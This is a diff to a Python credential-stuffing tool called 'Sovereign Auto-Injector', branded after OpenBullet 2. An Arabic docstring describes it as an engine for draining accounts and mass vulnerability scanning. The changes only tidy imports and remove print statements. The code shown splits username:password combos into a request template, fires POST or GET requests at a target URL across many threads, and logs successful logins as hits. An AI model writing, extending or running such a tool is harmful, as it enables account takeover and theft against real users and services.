@@ -5,13 +5,7 @@ Sovereign Auto-Injector v50.0 (OpenBullet 2 Sovereign Core)
 المحرك الآلي لاستنزاف الحسابات وفحص الثغرات الجماعي بنمط السرب.
 (c) 2026 Al-Mu'izz Sovereign Systems - Al-Ghazali Root
 """
-import requests
-import threading
-import queue
-import json
-import time
-import sys
-import os
+import requests, threading, queue, json, time, sys, os
 from datetime import datetime
 
 class AutoInjector:
@@ -40,8 +34,8 @@ class AutoInjector:
                 if ':' in combo:
                     user, password = combo.split(':', 1)
                     payload = self.payload_template.replace('<USER>', user).replace('<PASS>', password)
-                    
                     start_time = time.time()
+                    
                     if self.method == 'POST':
                         resp = requests.post(self.target_url, data=payload, timeout=10, headers={'User-Agent': 'Sovereign-Injector/50.0'})
                     else:
@@ -52,15 +46,13 @@ class AutoInjector:
                         self.stats["hits"] += 1
                         result = {"combo": combo, "status": "HIT", "time": f"{time.time() - start_time:.2f}s", "timestamp": datetime.now().isoformat()}
                         self.results.append(result)
-                        print(f"[HIT] {combo}")
                 
-            except Exception as e:
+            except:
                 self.stats["errors"] += 1
             finally:
                 self.work_queue.task_done()
 
     def ignite(self):
-        print(f"[*] [SOVEREIGN_INJECTOR] Striking {self.target_url} with {self.threads_count} threads.")
         self.running = True
         threads = []
         for _ in range(self.threads_count):
